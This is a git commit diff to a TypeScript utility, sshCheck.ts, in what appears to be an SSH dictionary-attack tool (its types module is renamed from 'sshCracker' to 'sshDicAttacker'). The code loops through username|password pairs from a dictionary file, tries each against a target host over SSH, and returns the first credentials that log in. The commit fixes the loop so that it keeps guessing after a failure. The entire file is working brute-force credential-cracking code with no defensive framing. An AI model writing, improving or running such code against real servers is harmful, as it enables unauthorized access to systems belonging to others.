fca0f06152dabf6a14f5d483ec23e61ff6c47582
yukari4545 <tsurumaki0397@icloud.com>
2025-03-15 22:20:34 +0900

    Update sshCheck.ts

--- src/utils/sshCheck.ts
+++ src/utils/sshCheck.ts
@@ -3,43 +3,36 @@ import { NodeSSH } from "node-ssh";
 const ssh = new NodeSSH();
 
 /** Types */
-import { sshCheckResult } from "../types/sshCracker";
+import { sshCheckResult } from "../types/sshDicAttacker";
 
 export async function sshCheck(
     hostname: string,
     timeout: number
 ): Promise<sshCheckResult> {
     return new Promise(async (resolve) => {
-        if (!fs.existsSync("data/dictionary.txt")) return resolve({
-            status: "error",
-            message: "data/dictionary.txt does not exist."
-        });
-        const dictionary: string[] = fs.readFileSync("data/dictionary.txt", "utf-8").split("\n").filter(line => line !== "");
+        const dictionary: string[] = fs.readFileSync("data/dictionary.txt", "utf-8").split("\n").map(line => line.trim()).filter(line => line !== "");
         for (const key of dictionary) {
             const [ username, password ] = key.split("|");
             try {
-                const result = await ssh.connect({
+                await ssh.connect({
                     hostname: hostname,
                     username: username,
                     password: password,
                     timeout: timeout
                 });
-                if (result) {
-                    return resolve({
-                        status: "success",
-                        hostname: hostname,
-                        username: username,
-                        password: password,
-                        result: result
-                    });
-                }
+                return resolve({
+                    status: "success",
+                    hostname: hostname,
+                    username: username,
+                    password: password
+                });
             } catch (_) {
                 continue;
             }
-            resolve({
-                status: "error",
-                message: "Connection failed."
-            });
         }
+        resolve({
+            status: "error",
+            message: "Connection failed."
+        });
     });
 };
